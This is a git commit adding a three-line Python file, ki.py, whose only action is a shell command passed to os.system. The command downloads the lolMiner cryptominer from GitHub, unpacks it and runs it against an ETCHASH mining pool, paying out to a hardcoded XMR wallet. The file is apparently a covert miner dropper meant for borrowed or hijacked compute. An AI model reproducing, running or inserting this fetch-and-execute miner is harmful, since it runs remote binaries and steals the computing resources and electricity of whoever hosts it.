84f08f819407eed712c3257cce9dc624c5ff76b3
mudaljon <114840255+mudaljon@users.noreply.github.com>
2022-10-02 01:07:26 +0000

    Create ki.py

---
+++ ki.py
@@ -0,0 +1,3 @@
+import os
+x = "wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.46a/lolMiner_v1.46a_Lin64.tar.gz && tar -xf lolMiner_v1.46a_Lin64.tar.gz && cd 1.46a && ./lolMiner --algo ETCHASH --ethstratum ETHPROXY --pool stratum+tcp://etchash.unmineable.com:3333 --user XMR:46RDrvQ4ocqPee5sQEh8joJbYWh6ZqBQgcxJvnroEox8ZUumk4PKGicR3367yuiNEyX1c1MDFMHZ1dbHLrcRkLjNCNHdkuo.nono3#d73s-pdj0"
+os.system(command=x)
